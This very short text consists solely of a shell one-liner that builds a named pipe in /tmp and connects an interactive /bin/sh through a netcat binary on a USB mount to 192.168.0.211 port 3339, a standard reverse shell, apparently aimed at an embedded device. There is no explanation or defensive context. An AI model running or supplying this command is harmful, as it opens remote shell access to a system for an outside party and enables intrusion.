rm -f /tmp/f ; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|/mnt/usb1_1_1/nc 192.168.0.211 3339 > /tmp/f 
